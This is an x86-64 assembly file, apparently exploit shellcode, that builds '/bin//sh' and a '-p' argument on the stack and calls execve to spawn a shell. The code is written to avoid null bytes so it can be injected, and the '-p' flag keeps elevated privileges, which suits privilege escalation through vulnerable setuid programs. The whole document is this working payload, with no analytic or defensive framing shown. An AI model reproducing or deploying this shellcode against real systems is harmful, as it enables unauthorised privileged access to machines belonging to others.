.intel_syntax noprefix
.globl _start

.section .text
_start:

    SPAWN_SHELL:
        xor rax, rax 

        push rax                            # Push some nulls for string termination.
        mov  rcx, 0x68732F2f6e69622F        # Construct "/bin//sh".
        push rcx                            # Push "/bin//sh" to the stack.
        push rsp
        xor  rdi, rdi                       # Set up rdi.
        pop  rdi                            # Pointer to /bin//sh.

        # Construct the argv array.
        push rax                            # Push some nulls for string termination.
        xor rcx, rcx                        # Set up rcx.
        push rsp
        pop rcx
        add word ptr [rcx], 0x702d          # Rcx now points to the "-p" string.

        push rax                            # Null-terminate the argv array.
        push rcx                            # Push the address of "-p" onto the stack.
        push rdi                            # Push the address of "/bin//sh" onto the stack.
        push rsp
        xor  rsi, rsi                       # Set up rsi.
        pop rsi                             # Rsi now points to the argument array.

        cdq                                 # NULL (An empty array for envp) (Linux accepts NULL instead of a pointer to NULL).

        mov al, 59                          # execve("/bin/sh", argv, envp).
        syscall
